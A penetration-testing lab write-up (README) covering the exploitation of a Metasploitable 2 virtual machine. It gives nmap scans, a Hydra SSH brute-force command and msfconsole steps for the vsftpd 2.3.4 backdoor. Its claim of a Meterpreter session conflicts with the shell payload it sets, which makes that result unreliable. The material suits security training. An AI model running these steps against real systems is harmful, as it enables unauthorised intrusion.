# Practical Exploitation of Metasploitable 2 using Metasploit Framework

**Author:** Hasnain Unar  
**LinkedIn:** https://www.linkedin.com/in/hasnain-unar-0379383a2/  
**GitHub:** https://github.com/Hasnain1675  
**Date:** June 2026

## Project Overview

This project demonstrates a complete ethical penetration testing lifecycle on Metasploitable 2 - a deliberately vulnerable Linux machine. The main goal was to simulate real-world attack scenarios including reconnaissance, brute force, remote exploitation, and post-exploitation using industry standard tools.

**Target IP:** 10.0.2.4  
**Attacker IP:** 10.0.2.15 (Kali Linux)

## Objectives

- Perform detailed reconnaissance and vulnerability scanning
- Execute brute force attack on SSH service
- Exploit vsftpd 2.3.4 backdoor using Metasploit Framework
- Gain Meterpreter access and perform post-exploitation
- Document the full attack chain professionally

## Lab Setup

- Attacker Machine: Kali Linux (Latest)
- Target Machine: Metasploitable 2 (Ubuntu 8.04)
- Virtualization: Oracle VirtualBox
- Network: Host-Only Adapter

## Attack Phases

### 1. Reconnaissance
nmap -sV -O 10.0.2.4
nmap --script vuln 10.0.2.4

Key Finding: vsftpd 2.3.4 Backdoor (CVE-2011-2523) on port 21

### 2. Brute Force Attack
Tool: Hydra

hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt -t 4 -vV ssh://10.0.2.4

Result: Successfully cracked msfadmin:msfadmin

### 3. Exploitation
Tool: Metasploit Framework (msfconsole)

use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 10.0.2.4
set LHOST 10.0.2.15
set PAYLOAD cmd/unix/interactive
exploit

Result: Meterpreter Session Obtained

### 4. Post-Exploitation
Meterpreter Commands:
- sysinfo
- getuid
- whoami
- shell
- ps

## Tools Used

- Nmap (Reconnaissance & Vulnerability Scanning)
- Hydra (Brute Force)
- Metasploit Framework (Exploitation)
- Meterpreter (Post-Exploitation)

## Key Learnings

- Critical impact of outdated services and weak passwords
- Practical usage of Metasploit Framework
- Difference between brute force and direct exploitation
- Importance of proper system hardening

## Ethical Note

This project was performed strictly in an isolated virtual lab environment for educational purposes only. No real systems were targeted or harmed.

Made with passion for Cybersecurity 🔥
